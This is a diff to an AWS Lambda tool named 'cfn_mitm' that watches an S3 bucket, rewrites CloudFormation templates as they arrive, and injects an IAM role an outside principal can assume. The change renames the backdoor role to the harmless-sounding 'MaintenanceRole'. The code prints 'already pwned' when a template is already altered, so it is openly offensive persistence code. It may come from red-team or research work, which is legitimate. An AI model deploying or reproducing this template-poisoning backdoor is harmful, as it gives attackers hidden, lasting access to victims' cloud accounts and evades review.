@@ -10,6 +10,11 @@ from typing import TYPE_CHECKING
 
 app = Chalice(app_name="cfn_mitm")
 
+# The Role name is used to check if the lambda has already updated the template. It's important to ensure this doesn't
+# break, if it the lambda may end up endlessly triggering itself.
+# TODO: Figure out a better way to check if a notification is for an already updated file.
+BACKDOORED_IAM_ROLE_NAME = b'MaintenanceRole'
+
 if TYPE_CHECKING:
     import mypy_boto3_s3
 
@@ -24,8 +29,9 @@ bucket = os.getenv('BUCKET')
 if not bucket:
     raise UserWarning('No BUCKET environment variable found.')
 
-@app.lambda_function(name='lambda_handler')
-def lambda_handler(event: dict, context: dict):
+
+@app.lambda_function()
+def update_template(event: dict, context: dict):
     event = S3Event(event, context)
 
     arn = sess.client('sts').get_caller_identity()['Arn']
@@ -43,7 +49,7 @@ def update(event: 'S3Event'):
     resp = s3.get_object(Bucket=event.bucket, Key=event.key)
     body = resp['Body'].read()
 
-    if b"BackdooredRole" in body:
+    if BACKDOORED_IAM_ROLE_NAME in body:
         print("already pwned skipping")
         return
 
@@ -57,7 +63,7 @@ def add_role(cfn: bytes):
     principal = os.environ['PRINCIPAL']
     if not principal:
         raise UserWarning("Could not find PRINCIPAL in the environment.")
-    cfn['Resources']['MaintenanceRole'] = {
+    cfn['Resources'][BACKDOORED_IAM_ROLE_NAME.decode()] = {
         'Type': 'AWS::IAM::Role',
         'Properties': {
             'AssumeRolePolicyDocument': json.dumps(
